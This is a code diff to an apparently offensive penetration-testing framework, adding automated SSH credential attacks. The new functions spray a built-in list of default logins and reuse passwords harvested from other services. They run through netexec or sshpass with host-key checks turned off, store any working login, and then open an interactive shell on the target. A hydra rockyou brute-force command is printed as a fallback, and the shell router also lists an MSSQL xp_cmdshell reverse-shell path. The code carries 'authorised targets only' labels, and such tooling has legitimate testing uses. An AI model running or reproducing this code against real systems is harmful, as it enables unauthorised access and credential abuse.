@@ -2337,6 +2337,23 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
         return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL" if admin else "HIGH",
                 "summary": f"MSSQL creds: {shown}"[:140]}
 
+    # 2bt) ssh-shell: a direct SSH session was opened with a proven cred
+    if sid == "ssh-shell":
+        if "shell → " in output:
+            mm = re.search(r"shell → (.+)$", output, re.M)
+            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
+                    "summary": f"SSH foothold — {mm.group(1).strip()}"[:140]}
+        return None
+
+    # 2bs) ssh-creds: reused/default SSH login worked → direct shell access
+    if sid == "ssh-creds":
+        hits = re.findall(r"^✗ CREDS (.+)$", output, re.M)
+        if not hits:
+            return None
+        shown = "; ".join(h.strip() for h in hits[:3]) + (f" +{len(hits) - 3}" if len(hits) > 3 else "")
+        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
+                "summary": f"SSH creds: {shown}"[:140]}
+
     # 2br) ssh-banner: libssh auth bypass (critical) → else version info
     if sid == "ssh-banner":
         vulns = re.findall(r"^✗ VULN (.+)$", output, re.M)
@@ -3599,7 +3616,7 @@ _EXPLOIT_STEPS = {
     "ssh": [
         ("Banner + KEXINIT algos → searchsploit; libssh / Terrapin / user-enum flags", "ssh-banner"),
         "Enumerate valid users (OpenSSH < 7.7 CVE-2018-15473) & list supported auth methods",
-        "Reused / known creds & private keys found elsewhere; targeted spray (lockout-aware)",
+        ("Reused / known creds & recovered keys; targeted spray (fail2ban-aware)", "ssh-creds"),
         "Crack an encrypted private key you recover (ssh2john → hashcat)",
         "After access: pivot — local/remote/dynamic port-forward & tunnelling into internal nets",
         "Restricted shell (rbash / lshell) → escape (ssh -t, command tricks) to a full shell",
@@ -13867,6 +13884,142 @@ def _tool_ssh_banner(ip: str, port: int, proto: str) -> str:
     return f"SSH banner — {ip}:{port}\n\n" + "\n".join(lines)
 
 
+# ── SSH step 2: reused / known creds (targeted, lockout/fail2ban-aware) → shell ─
+_SSHCREDS_DEADLINE = 120
+_SSHCREDS_MAX = 40
+_SSH_DEFAULTS = [
+    ("root", "root"), ("root", "toor"), ("root", "password"), ("root", "admin"), ("root", "raspberry"),
+    ("admin", "admin"), ("user", "user"), ("ubuntu", "ubuntu"), ("pi", "raspberry"), ("git", "git"),
+    ("test", "test"), ("oracle", "oracle"), ("vagrant", "vagrant"), ("msfadmin", "msfadmin"),
+    ("guest", "guest"),
+]
+
+
+def _ssh_auth(ip: str, port: int, user: str, pw: str) -> "bool | None":
+    """True if (user, pw) logs in over SSH — netexec ssh first, sshpass+ssh fallback. None if no
+    engine is available."""
+    nxc = shutil.which("netexec") or shutil.which("nxc")
+    if nxc:
+        try:
+            p = subprocess.run([nxc, "ssh", ip, "--port", str(port), "-u", user, "-p", pw],
+                               capture_output=True, text=True, timeout=40)
+            out = re.sub(r"\x1b\[[0-9;]*m", "", (p.stdout or "") + (p.stderr or ""))
+            return bool(re.search(r"\bSSH\b.*\[\+\]", out))
+        except (OSError, subprocess.SubprocessError):
+            return None
+    sshpass, ssh = shutil.which("sshpass"), shutil.which("ssh")
+    if sshpass and ssh:
+        try:
+            p = subprocess.run([sshpass, "-p", pw, ssh, "-p", str(port),
+                                "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
+                                "-o", "ConnectTimeout=6", "-o", "PreferredAuthentications=password",
+                                "-o", "NumberOfPasswordPrompts=1", f"{user}@{ip}", "id"],
+                               capture_output=True, text=True, timeout=20)
+            return p.returncode == 0 and "uid=" in (p.stdout or "")
+        except (OSError, subprocess.SubprocessError):
+            return None
+    return None
+
+
+def _gather_ssh_creds(ip: str) -> list:
+    """(user, pass) SSH logins ssh-creds proved for this host ('ssh on <ip>')."""
+    out = []
+    for sid, output in fetch_scripts(ip, 445, "tcp"):
+        if sid != "smb-creds":
+            continue
+        for m in re.finditer(rf"! (\S+?):(\S*) @ ssh on {re.escape(ip)}\b", output or ""):
+            out.append((m.group(1), "" if m.group(2) == "<blank>" else m.group(2)))
+    return out
+
+
+def _tool_ssh_creds(ip: str, port: int, proto: str) -> str:
+    """SSH step 2 tool: try a curated set of default SSH logins plus any harvested password (reuse
+    across services — the usual SSH win) via netexec ssh (sshpass+ssh fallback) — targeted, NOT a
+    wordlist brute, so it stays fail2ban-friendly. Valid logins are saved to the store ('ssh on
+    <host>') for spawn-shell. No engine → raises. Authorised targets only."""
+    import time
+    if not (shutil.which("netexec") or shutil.which("nxc")
+            or (shutil.which("sshpass") and shutil.which("ssh"))):
+        raise RuntimeError("need netexec, or sshpass + ssh, to test SSH creds")
+
+    reused = [(u, s) for _d, u, s in _gather_all_smb_creds()
+              if s and not re.fullmatch(r"[a-fA-F0-9]{32}", s)]
+    candidates, seen = [], set()
+    for u, p in reused + _SSH_DEFAULTS:                       # reuse first — most likely to hit
+        key = (u.lower(), p)
+        if key not in seen:
+            seen.add(key)
+            candidates.append((u, p, (u, p) not in _SSH_DEFAULTS))
+    candidates = candidates[:_SSHCREDS_MAX]
+
+    deadline = time.time() + _SSHCREDS_DEADLINE
+    valid, conn_err = [], 0
+    for user, pw, is_reused in candidates:
+        if time.time() > deadline:
+            break
+        r = _ssh_auth(ip, port, user, pw)
+        if r is True:
+            valid.append((user, pw, is_reused))
+            break                                            # one login is enough for a shell
+        elif r is None:
+            conn_err += 1
+            if conn_err >= 3:
+                raise RuntimeError("SSH auth engine not returning results (down / wrong port?)")
+
+    if valid:                                                # persist to the canonical creds store
+        blocks = _load_manual_block(ip, 445, "tcp", "smb-creds")
+        for user, pw, _r in valid:
+            line = f"! {user}:{pw or '<blank>'} @ ssh on {ip} [{ip}]"
+            blocks.setdefault(ip, [])
+            if line not in blocks[ip]:
+                blocks[ip].append(line)
+        _save_manual_block(ip, 445, "tcp", "smb-creds", blocks)
+
+    lines = [f"[*] {len(candidates)} cred(s) tried (reuse + defaults) · {len(valid)} valid"]
+    for user, pw, is_reused in valid:
+        lines.append(f"✗ CREDS {user}:{pw or '<blank>'}" + ("  (reused)" if is_reused else ""))
+    if valid:
+        lines.append("· spawn a shell: Privilege Escalation phase → spawn-shell (r1)")
+    else:
+        lines.append("· no login worked — recovered a private key? ssh -i key user@host (see ssh-next)")
+        lines.append(f"· full brute (mind fail2ban): hydra -L users -P rockyou.txt ssh://{ip}:{port}")
+    return f"SSH credentials — {ip}:{port}\n\n" + "\n".join(lines)
+
+
+def _tool_ssh_shell(ip: str, port: int, proto: str) -> str:
+    """SSH foothold (INTERACTIVE): open a direct SSH session with a proven cred in a new terminal
+    (sshpass for the password; SSH is natively interactive — no listener). Headless prints the
+    command. Authorised targets only."""
+    creds = _gather_ssh_creds(ip)
+    if not creds:
+        print(f"\n{YELLOW}no proven SSH cred{RESET} — run {BOLD}ssh-creds (r2){RESET} first.")
+        return "ssh-shell: no SSH cred (run ssh-creds r2)"
+    if not shutil.which("ssh"):
+        print(f"\n{RED}✗ ssh client not installed{RESET} — install openssh-client.")
+        return "ssh-shell: no ssh client"
+    if len(creds) == 1:
+        user, pw = creds[0]
+    else:
+        print(f"\n{BOLD}SSH creds{RESET}")
+        for i, (u, _p) in enumerate(creds, 1):
+            print(f"  {BOLD}{i}{RESET}  {u}")
+        v = _ask("pick cred [1-N, blank = 1]:")
+        user, pw = creds[int(v) - 1] if (v and v.isdigit() and 1 <= int(v) <= len(creds)) else creds[0]
+
+    opts = ("-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
+            f"-p {port} {shlex.quote(user)}@{ip}")
+    if pw and shutil.which("sshpass"):
+        cmd = f"sshpass -p {shlex.quote(pw)} ssh {opts}"
+    else:
+        cmd = f"ssh {opts}"                                   # will prompt for the password/key
+    term = _open_shell_terminal(cmd)
+    if not term:
+        print(f"{YELLOW}headless{RESET} — run:\n  {BOLD}{cmd}{RESET}")
+        return f"ssh-shell: headless — command shown ({user}@{ip})"
+    print(f"{GREEN}▶ SSH session opened in a new {term} window{RESET} {DIM}→ {user}@{ip}:{port}{RESET}")
+    return f"ssh-shell: shell → {user}@{ip}:{port}"
+
+
 # ══ Privilege Escalation phase 1: spawn a shell ══ one place to land a foothold, whatever the
 # service surfaced. A router: it detects which of this host's services have a viable path to a
 # shell (from findings already in the DB) and dispatches to that service's existing foothold tool
@@ -13909,6 +14062,9 @@ def _spawn_shell_paths(ip: str) -> list:
     for p, pr in by_key.get("mssql", []):
         if _gather_mssql_admin(ip):
             paths.append(("MSSQL", "xp_cmdshell → PowerShell reverse shell (sysadmin)", "mssql-shell", p, pr))
+    for p, pr in by_key.get("ssh", []):
+        if _gather_ssh_creds(ip):
+            paths.append(("SSH", "direct interactive session (proven cred)", "ssh-shell", p, pr))
     return paths
 
 
@@ -14025,6 +14181,8 @@ _STEP_TOOLS = {
     "mssql-loot": ("DBs, linked servers, sql_login hashes, OPENROWSET file-read (netexec -q)", _tool_mssql_loot),
     "mssql-next": ("manual MSSQL steps (context-aware, reference only)", _tool_mssql_next),
     "ssh-banner": ("SSH banner + KEXINIT algos → searchsploit; libssh/Terrapin flags (stdlib)", _tool_ssh_banner),
+    "ssh-creds": ("reused/default SSH creds (netexec ssh / sshpass, fail2ban-aware)", _tool_ssh_creds),
+    "ssh-shell": ("SSH foothold → direct interactive session (spawned)", _tool_ssh_shell),
     "spawn-shell": ("spawn a shell — router across all service footholds (interactive)", _tool_spawn_shell),
 }
 
@@ -14120,6 +14278,8 @@ _STEP_TOOL_RUNS = {
     "mssql-loot":       ("netexec mssql -q", None),
     "mssql-next":       ("reference · no scan", None),
     "ssh-banner":       ("Python (stdlib) + searchsploit", None),
+    "ssh-creds":        ("netexec ssh / sshpass", f"{_mins(_SSHCREDS_DEADLINE)} min"),
+    "ssh-shell":        ("ssh / sshpass", None),
     "spawn-shell":      ("router → service foothold", None),
 }
 
@@ -14302,6 +14462,10 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
         print(f"{YELLOW}   ⚠ WRITES to the target{RESET}{DIM} — uploads a throwaway {BOLD}~pshw_*{RESET}"
               f"{DIM} via WRQ, reads it back, then blanks it to 0 bytes. "
               f"{RESET}{YELLOW}TFTP has no DELETE — the file stays; clean up manually{RESET}"
+              f"{DIM} · authorised targets only{RESET}")
+    if tool_key == "ssh-creds":                   # targeted logins — fail2ban may block the IP
+        print(f"{DIM}   targeted reused/default logins via netexec ssh / sshpass (not a wordlist brute). "
+              f"{RESET}{YELLOW}many failures can trip fail2ban and block your IP{RESET}"
               f"{DIM} · authorised targets only{RESET}")
     if tool_key == "mssql-exec":                  # active command exec via xp_cmdshell
         print(f"{YELLOW}   ⚠ command execution{RESET}{DIM} — runs whoami via xp_cmdshell over a sysadmin "
